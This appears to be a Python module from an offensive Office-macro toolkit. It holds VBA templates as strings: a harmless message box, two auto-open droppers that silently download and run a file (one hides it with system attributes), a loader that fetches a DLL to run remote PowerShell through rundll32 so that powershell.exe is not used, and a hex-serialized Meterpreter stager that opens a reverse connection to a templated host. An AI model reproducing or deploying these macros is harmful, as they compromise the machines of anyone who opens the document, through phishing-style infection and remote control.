#!/usr/bin/env python
# encoding: utf-8

HELLO = \
"""
Private Sub toto()
    MsgBox "Hello from <<<TEMPLATE>>>" & vbCrLf & "Remember to always be careful when you enable MS Office macros." & vbCrLf & "Have a nice day!"
End Sub

Private Sub testMacroXl()
    Application.Run "ThisWorkbook.toto"
End Sub

Private Sub testMacroWd()
    toto
End Sub

' triggered when Word/PowerPoint generator is used 
Sub AutoOpen()
    testMacroWd
End Sub

' triggered when Excel generator is used
Sub Workbook_Open()
    testMacroXl
End Sub
"""

DROPPER = \
"""

'Download and execute file
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim downloadPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<TEMPLATE>>>"
    downloadPath = "<<<TEMPLATE>>>"
    
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
    WinHttpReq.Open "GET", myURL, False ', "username", "password"
    WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    WinHttpReq.Send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
        oStream.Close
        result = Shell(downloadPath, 0) ' vbHide = 0
    End If    
    
End Sub

Sub AutoOpen()
    DownloadAndExecute
End Sub
Sub Workbook_Open()
    DownloadAndExecute
End Sub
"""

DROPPER2 = \
"""

'Download and execute file
' File is protected with readonly, hidden, and system attributes
' Will not download if payload has already been dropped once on system
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim downloadPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<TEMPLATE>>>"
    downloadPath = "<<<TEMPLATE>>>"
    
    If Dir(downloadPath, vbHidden + vbSystem) = "" Then
        Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
        WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
        WinHttpReq.Open "GET", myURL, False ', "username", "password"
        WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        WinHttpReq.Send
        
        If WinHttpReq.Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write WinHttpReq.ResponseBody
            
            oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
            oStream.Close
            SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
            result = Shell(downloadPath, 0) ' vbHide = 0
        End If
       
    End If
    
End Sub


Sub AutoOpen()
    DownloadAndExecute
End Sub
Sub Workbook_Open()
    DownloadAndExecute
End Sub
"""


DROPPER_PS = \
r"""
' Download and execute powershell script using rundll32.exe, without powershell.exe
' Thx to https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
' And https://github.com/p3nt4/PowerShdll

Sub AutoOpen()
    Debugging
End Sub

Sub Workbook_Open()
    Debugging
End Sub

Public Function Debugging() As Variant
    DownloadDLL
    Dim Str As String
    Str = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<TEMPLATE>>> } ^| iex;"
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
End Function


Sub DownloadDLL()
    Dim dll_Loc As String
    dll_Loc = Environ("TEMP") & "\powershdll.dll"
    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    Dim dll_URL As String
    #If Win64 Then
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll"
    #Else
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll"
    #End If
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile dll_Loc
        oStream.Close
    End If
End Sub

"""


METERPRETER =  \
r"""
'   _____                                _____          __
'  /     \ _____    ___________  ____   /     \   _____/  |_  ___________
' /  \ /  \\__  \ _/ ___\_  __ \/  _ \ /  \ /  \_/ __ \   __\/ __ \_  __ \
'/    Y    \/ __ \\  \___|  | \(  <_> )    Y    \  ___/|  | \  ___/|  | \/
'\____|__  (____  /\___  >__|   \____/\____|__  /\___  >__|  \___  >__|
'        \/     \/     \/                     \/     \/          \/

'                       Metasploit Big Game Phising Bait - by Cn33liz 2017

' Original Repo: https://github.com/Cn33liz/MacroMeter

'VBA Reversed TCP Meterpreter Stager
'CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
'https://github.com/tyranid/DotNetToJScript

' Adapted for macro_pack to also work in MS word

Const RHOST As String = "<<<TEMPLATE>>>"
Const RPORT As String = "<<<TEMPLATE>>>"

Sub AutoOpen()
    MacroMeter
End Sub
Sub Workbook_Open()
    MacroMeter
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function MacroMeter()
    Dim serialized_obj
    serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
    serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
    serialized_obj = serialized_obj & "656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    serialized_obj = serialized_obj & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E"
    serialized_obj = serialized_obj & "666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44"
    serialized_obj = serialized_obj & "656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    serialized_obj = serialized_obj & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A"
    serialized_obj = serialized_obj & "6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C6567617465536572"
    serialized_obj = serialized_obj & "69616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    serialized_obj = serialized_obj & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056"
    serialized_obj = serialized_obj & "657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237"
    serialized_obj = serialized_obj & "376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    serialized_obj = serialized_obj & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C"
    serialized_obj = serialized_obj & "697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374"
    serialized_obj = serialized_obj & "656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    serialized_obj = serialized_obj & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C"
    serialized_obj = serialized_obj & "000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A"
    serialized_obj = serialized_obj & "6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    serialized_obj = serialized_obj & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E54797065"
    serialized_obj = serialized_obj & "5B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B65"
    serialized_obj = serialized_obj & "2853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    serialized_obj = serialized_obj & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E30"
    serialized_obj = serialized_obj & "2E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530"
    serialized_obj = serialized_obj & "383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    serialized_obj = serialized_obj & "6C790617000000044C6F61640A0F0C000000001C0000024D5A90000300000004000000FFFF0000B800000000000000400000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD"
    serialized_obj = serialized_obj & "21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    serialized_obj = serialized_obj & "00504500004C0103002CF919590000000000000000E00022200B013000001400000006000000000000663300000020000000"
    serialized_obj = serialized_obj & "4000000000001000200000000200000400000000000000040000000000000000800000000200000000000003004085000010"
    serialized_obj = serialized_obj & "0000100000000010000010000000000000100000000000000000000000143300004F00000000400000D80300000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000006000000C000000DC3100001C0000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E"
    serialized_obj = serialized_obj & "746578740000006C130000002000000014000000020000000000000000000000000000200000602E72737263000000D80300"
    serialized_obj = serialized_obj & "00004000000004000000160000000000000000000000000000400000402E72656C6F6300000C000000006000000002000000"
    serialized_obj = serialized_obj & "1A00000000000000000000000000004000004200000000000000000000000000000000483300000000000048000000020005"
    serialized_obj = serialized_obj & "00D8220000040F00000100000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000133007007102000001000011160A20001000000B20002000000C1F400D7E1000000A26"
    serialized_obj = serialized_obj & "7E1000000A13041613057E010000042D391211FE15030000022002020000121128010000062C02162AD01A00000128110000"
    serialized_obj = serialized_obj & "0A72010000701F246F1200000A8002000004178001000004031206281300000A2D02162A041632080420FFFF00003102162A"
    serialized_obj = serialized_obj & "110604731400000A130711076F1500000A130818171C7E1000000A161628030000061309110915731600000A281700000A2C"
    serialized_obj = serialized_obj & "02162A1F401811076F1800000A6F1900000A11076F1A00000A731B00000A281C00000A7E0200000411086F1D00000A740100"
    serialized_obj = serialized_obj & "001B130A1109110A11086F1E00000A7E1000000A7E1000000A7E1000000A7E1000000A280400000616FE01130B110B2D1011"
    serialized_obj = serialized_obj & "09280600000626280200000626162A1E281F00000A130C110C1E28070000061109110C1A16280500000626110C282000000A"
    serialized_obj = serialized_obj & "282100000A0A110C282200000A1B130D282300000A1E33041F0A130D06110D588D26000001130E282300000A1E3311110E16"
    serialized_obj = serialized_obj & "1F489C110E1720BF0000009C2B09110E1620BF0000009C1713121109282100000A282400000A1313282300000A1E33031813"
    serialized_obj = serialized_obj & "121613172B13110E111711125811131117919C11171758131711171A32E806281F00000A1314111406280700000616131516"
    serialized_obj = serialized_obj & "13162B3C110911140611155916280500000613161613182B1A110E1118110D5811155811141118282500000A9C1118175813"
    serialized_obj = serialized_obj & "181118111632E01115111658131511150632BF1114282200000A070860130F7E1000000A110E8E69110F0928080000061310"
    serialized_obj = serialized_obj & "110E161110110E8E69282600000A161611101104161205280900000615280A00000626110928060000062628020000062611"
    serialized_obj = serialized_obj & "0B2A1E02282700000A2A00000042534A4201000100000000000C00000076322E302E35303732370000000005006C00000024"
    serialized_obj = serialized_obj & "050000237E000090050000D806000023537472696E677300000000680C000014000000235553007C0C000010000000234755"
    serialized_obj = serialized_obj & "49440000008C0C00007802000023426C6F6200000000000000020000015775021C0902000000FA0133001600000100000027"
    serialized_obj = serialized_obj & "00000003000000090000000C00000024000000270000000F00000002000000010000000100000004000000010000000A0000"
    serialized_obj = serialized_obj & "000100000002000000010000000000670301000000000006002B02DE0406009802DE0406005C019D040F00FE040000060084"
    serialized_obj = serialized_obj & "01D60306000E02D6030600EF01D60306007F02D60306004B02D60306006402D60306009B01D60306007001BF0406003401BF"
    serialized_obj = serialized_obj & "040600B601D6030600C70364050600D301640506004201C7060600140681030600FF03D6030A008C06D9050A000701D9050A"
    serialized_obj = serialized_obj & "00DC00D9050A004605D9050A008E053B060A0068063B060A00AE053B060600D2008103060096048103060026018103060099"
    serialized_obj = serialized_obj & "00810306002905D6030A006A063B060A00AA033B060A0080053B060A001D013B0606009503C70606003C03BF040600BA0281"
    serialized_obj = serialized_obj & "0306007F048103000000000A00000000000100010001001000730400004900010001000A011000350000006D0003000D0011"
    serialized_obj = serialized_obj & "007D006E011100440471010600F60375010600880375010610E80378010610F80578010600EC057501060000037501060016"
    serialized_obj = serialized_obj & "044300000000008000932039047B01010000000000800096202804A400030000000000800093204606830103000000000080"
    serialized_obj = serialized_obj & "0093201B0690010900000000008000912087069C011000000000008000962050069A0014000000000080009120AD06A50115"
    serialized_obj = serialized_obj & "0000000000800091204600AB01170000000000800091205E00B3011B0000000000800091200706BE01210050200000000086"
    serialized_obj = serialized_obj & "002606C4012300CD220000000086188C0406002500010001006B00020002003300010001009A0601000200120101000300E9"
    serialized_obj = serialized_obj & "00010004000904010005003304010006005E0501000100C50001000200BC0501000300DD02010004004D0401000500560401"
    serialized_obj = serialized_obj & "0006002E0001000700290001000100C50001000200600401000300730601000400520501000100C50000000100BB03000002"
    serialized_obj = serialized_obj & "001C0300000100A40500000200EF0200000300F600000004003106000001000D0500000200D10200000300CA050000040067"
    serialized_obj = serialized_obj & "0400000500360500000600530001000100AB0001000200B00400000100130300000200820609008C04010011008C04060019"
    serialized_obj = serialized_obj & "008C040A0029008C04100031008C04100039008C04100041008C04100049008C04100051008C04100059008C04100061008C"
    serialized_obj = serialized_obj & "04150069008C04100071008C04100081008C041A0089008C040600E10023044300E900B3004600E90089004D00C1002B0155"
    serialized_obj = serialized_obj & "00C9008C045D000101F6026400E1008C040100E100BB066900C90098056F0091000A037400C9007906780009018C047C0021"
    serialized_obj = serialized_obj & "01920006009900BF028800D100C8027800290123039000290192049500E1005C069A00290130039F00E100C802A400390120"
    serialized_obj = serialized_obj & "05A8002901B602AE002901A806B40091008C04060027007B0071022E000B00CA012E001300D3012E001B00F2012E002300FB"
    serialized_obj = serialized_obj & "012E002B0016022E00330016022E003B0016022E004300FB012E004B001C022E00530016022E005B0016022E00630034022E"
    serialized_obj = serialized_obj & "006B005E0243005B006B020A0066010C006A0108000600C60020004F0344035A0301008D0062110300390401000001050028"
    serialized_obj = serialized_obj & "0402004401070046060100400109001B06010000010B008706010044010D005006010000010F00AD06030000011100460004"
    serialized_obj = serialized_obj & "00000113005E0004000001150007060400048000000100000000000000000000000000130000000200000000000000000000"
    serialized_obj = serialized_obj & "00BD003D0000000000020000000000000000000000BD008103000000000300020000000000006B65726E656C3332003C4D6F"
    serialized_obj = serialized_obj & "64756C653E004353686172702D4D65746572707265746572444C4C0067514F530073514F53006C7057534144617461006D73"
    serialized_obj = serialized_obj & "636F726C6962005669727475616C416C6C6F63006C7054687265616449640043726561746554687265616400775665727369"
    serialized_obj = serialized_obj & "6F6E52657175657374656400496E697469616C697A6564004765744669656C640044656D616E640052756E74696D65547970"
    serialized_obj = serialized_obj & "6548616E646C65006848616E646C65004765745479706546726F6D48616E646C6500736F636B657448616E646C650056616C"
    serialized_obj = serialized_obj & "7565547970650050726F746F636F6C547970650070726F746F636F6C5479706500666C416C6C6F636174696F6E5479706500"
    serialized_obj = serialized_obj & "536F636B65745479706500736F636B657454797065005472616E73706F727454797065005472795061727365004775696441"
    serialized_obj = serialized_obj & "747472696275746500556E76657269666961626C65436F64654174747269627574650044656275676761626C654174747269"
    serialized_obj = serialized_obj & "6275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C65417474726962757465004173"
    serialized_obj = serialized_obj & "73656D626C7954726164656D61726B41747472696275746500417373656D626C7946696C6556657273696F6E417474726962"
    serialized_obj = serialized_obj & "7574650053656375726974795065726D697373696F6E41747472696275746500417373656D626C79436F6E66696775726174"
    serialized_obj = serialized_obj & "696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174"
    serialized_obj = serialized_obj & "696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F647563744174747269627574650041"
    serialized_obj = serialized_obj & "7373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E79417474726962757465"
    serialized_obj = serialized_obj & "0052756E74696D65436F6D7061746962696C6974794174747269627574650052656164427974650047657456616C75650067"
    serialized_obj = serialized_obj & "65745F53697A65006477537461636B53697A6500736F636B65744164647265737353697A6500647753697A65005365726961"
    serialized_obj = serialized_obj & "6C697A6500694D6178556470446700546F537472696E67006970537472696E67006C656E67746800416C6C6F6348476C6F62"
    serialized_obj = serialized_obj & "616C004672656548476C6F62616C004D61727368616C005773325F33322E646C6C007773325F33322E646C6C006B65726E65"
    serialized_obj = serialized_obj & "6C33322E646C6C004353686172702D4D65746572707265746572444C4C2E646C6C0053797374656D00774869676856657273"
    serialized_obj = serialized_obj & "696F6E00436F64654163636573735065726D697373696F6E00536F636B65745065726D697373696F6E0044657374696E6174"
    serialized_obj = serialized_obj & "696F6E005365637572697479416374696F6E0053797374656D2E5265666C656374696F6E00737A4465736372697074696F6E"
    serialized_obj = serialized_obj & "007756657374696F6E004669656C64496E666F0070726F746F636F6C496E666F006C7056656E646F72496E666F005A65726F"
    serialized_obj = serialized_obj & "00575341436C65616E75700067726F75700057534153746172747570006D5F42756666657200696E427566666572006F7574"
    serialized_obj = serialized_obj & "42756666657200627566666572006C70506172616D65746572004D6574657250726574657200426974436F6E766572746572"
    serialized_obj = serialized_obj & "002E63746F720052656164496E745074720053797374656D2E446961676E6F73746963730064774D696C6C697365636F6E64"
    serialized_obj = serialized_obj & "730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F"
    serialized_obj = serialized_obj & "6D70696C6572536572766963657300446562756767696E674D6F646573006C70546872656164417474726962757465730047"
    serialized_obj = serialized_obj & "657442797465730042696E64696E67466C6167730064774372656174696F6E466C61677300536F636B6574466C6167730073"
    serialized_obj = serialized_obj & "6F636B6574466C61677300666C6167730053797374656D2E53656375726974792E5065726D697373696F6E73004E6574776F"
    serialized_obj = serialized_obj & "726B41636365737300495041646472657373006765745F41646472657373006C704164647265737300536F636B6574416464"
    serialized_obj = serialized_obj & "7265737300736F636B657441646472657373006C705374617274416464726573730053797374656D2E4E65742E536F636B65"
    serialized_obj = serialized_obj & "747300694D6178536F636B65747300737A53797374656D5374617475730057616974466F7253696E676C654F626A65637400"
    serialized_obj = serialized_obj & "575341436F6E6E656374004D5346436F6E6E65637400666C50726F746563740053797374656D2E4E657400575341536F636B"
    serialized_obj = serialized_obj & "657400636C6F7365736F636B6574006F705F4578706C69636974004950456E64506F696E7400636F756E74006765745F506F"
    serialized_obj = serialized_obj & "727400706F72740072656376004164647265737346616D696C79006164647265737346616D696C7900436F70790052746C5A"
    serialized_obj = serialized_obj & "65726F4D656D6F7279006F705F457175616C6974790053797374656D2E5365637572697479000000116D005F004200750066"
    serialized_obj = serialized_obj & "00660065007200000043E5BF6F48F1014F965F41F9CBD50E7200042001010803200001052001011111042001010E04200101"
    serialized_obj = serialized_obj & "0205200101113D220719080909091809126112651269181D050218081D050918110C081D0518080808080206180600011275"
    serialized_obj = serialized_obj & "1179072002124D0E117D070002020E10126106200201126108042000126905000202181804200012610320000E032000080B"
    serialized_obj = serialized_obj & "20040111808911808D0E080420011C1C021D050400011808040001181804000108180400010118030000080500011D050805"
    serialized_obj = serialized_obj & "0002051808080004011D0508180808B77A5C561934E089809E2E01808453797374656D2E53656375726974792E5065726D69"
    serialized_obj = serialized_obj & "7373696F6E732E53656375726974795065726D697373696F6E4174747269627574652C206D73636F726C69622C2056657273"
    serialized_obj = serialized_obj & "696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135"
    serialized_obj = serialized_obj & "63353631393334653038391501540210536B6970566572696669636174696F6E0103178101031780810206020306124D0206"
    serialized_obj = serialized_obj & "0602060E070002080610110C0C0006181151115511591809080B000708181D05081818181808000408181808115D05000201"
    serialized_obj = serialized_obj & "180807000418180909090A00061809091818091009050002091809052002020E080801000800000000001E01000100540216"
    serialized_obj = serialized_obj & "577261704E6F6E457863657074696F6E5468726F7773010801000200000000001A0100154353686172702D4D657465727072"
    serialized_obj = serialized_obj & "65746572444C4C000005010000000017010012436F7079726967687420C2A920203230313700002901002430363636396336"
    serialized_obj = serialized_obj & "652D626266332D343661622D386336652D34333632643062616265346100000C010007312E302E302E300000050100010000"
    serialized_obj = serialized_obj & "04010000000000000000002CF9195900000000020000001C010000F8310000F81300005253445336C11793C66F63418A544B"
    serialized_obj = serialized_obj & "06C4AA127C01000000433A5C446576656C6F706D656E745C4353686172702D4D65746572707265746572444C4C5C43536861"
    serialized_obj = serialized_obj & "72702D4D65746572707265746572444C4C5C6F626A5C52656C656173655C4353686172702D4D65746572707265746572444C"
    serialized_obj = serialized_obj & "4C2E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000003C330000000000000000000056330000002000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000048330000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C00000000"
    serialized_obj = serialized_obj & "00FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030"
    serialized_obj = serialized_obj & "000080000000000000000000000000000001000000000048000000584000007C03000000000000000000007C033400000056"
    serialized_obj = serialized_obj & "0053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000"
    serialized_obj = serialized_obj & "000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069"
    serialized_obj = serialized_obj & "006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E000000000000"
    serialized_obj = serialized_obj & "00B004DC020000010053007400720069006E006700460069006C00650049006E0066006F000000B802000001003000300030"
    serialized_obj = serialized_obj & "003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F"
    serialized_obj = serialized_obj & "006D00700061006E0079004E0061006D0065000000000000000000540016000100460069006C006500440065007300630072"
    serialized_obj = serialized_obj & "0069007000740069006F006E00000000004300530068006100720070002D004D006500740065007200700072006500740065"
    serialized_obj = serialized_obj & "00720044004C004C000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E"
    serialized_obj = serialized_obj & "0030002E003000000054001A00010049006E007400650072006E0061006C004E0061006D0065000000430053006800610072"
    serialized_obj = serialized_obj & "0070002D004D00650074006500720070007200650074006500720044004C004C002E0064006C006C0000004800120001004C"
    serialized_obj = serialized_obj & "006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9"
    serialized_obj = serialized_obj & "0020002000320030003100370000002A00010001004C006500670061006C00540072006100640065006D00610072006B0073"
    serialized_obj = serialized_obj & "0000000000000000005C001A0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043"
    serialized_obj = serialized_obj & "00530068006100720070002D004D00650074006500720070007200650074006500720044004C004C002E0064006C006C0000"
    serialized_obj = serialized_obj & "004C0016000100500072006F0064007500630074004E0061006D006500000000004300530068006100720070002D004D0065"
    serialized_obj = serialized_obj & "0074006500720070007200650074006500720044004C004C000000340008000100500072006F006400750063007400560065"
    serialized_obj = serialized_obj & "007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079"
    serialized_obj = serialized_obj & "002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000003000000C00000068330000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000010D00000004000000"
    serialized_obj = serialized_obj & "091700000009060000000916000000061A0000002753797374656D2E5265666C656374696F6E2E417373656D626C79204C6F"
    serialized_obj = serialized_obj & "616428427974655B5D29080000000A0B"

    entry_class = "MeterPreter"

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")
    Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set al = CreateObject("System.Collections.ArrayList")

    Dim dec
    dec = decodeHex(serialized_obj)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    o.MSFConnect RHOST, RPORT
End Function
"""
